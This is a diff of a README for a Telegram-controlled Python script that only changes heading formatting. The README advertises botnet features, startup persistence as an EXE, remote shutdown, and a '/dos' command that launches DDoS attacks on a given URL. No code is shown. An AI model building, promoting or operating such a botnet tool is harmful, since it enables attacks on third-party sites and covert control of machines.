@@ -2,13 +2,13 @@
 This script enables you to control your laptop via a bot. To customize it, create a bot and get a token from BotFather, which you’ll replace in the script.  Features include:  Remote Laptop Control Botnet Attack Capabilities Shutdown and Restart Functions Notification Alerts Note: Misuse for illegal activities is prohibited.
 when u run script send script 
 
-Features
+#Features
 Executable Stability: Once converted to an EXE file, it runs continuously with a single click and integrates into the startup menu of the laptop.
 Offline Functionality: The script continues to work even if the internet connection is lost.
 Botnet Functionality: Supports botnet operations.
 User Notifications: Can send notifications to all users.
 
-Commands
+#Commands
 /off: Shuts down the laptop.
 /dos www.example.com: Performs a DDoS attack on the specified URL.
 /OFFDOS: Stops the DDoS attack.
@@ -16,7 +16,7 @@ Commands
 /noti: Sends a message notification to the user.
 
 
-if u want pytohn to convert exe : 
+#if u want pytohn to convert exe : 
 
 
 
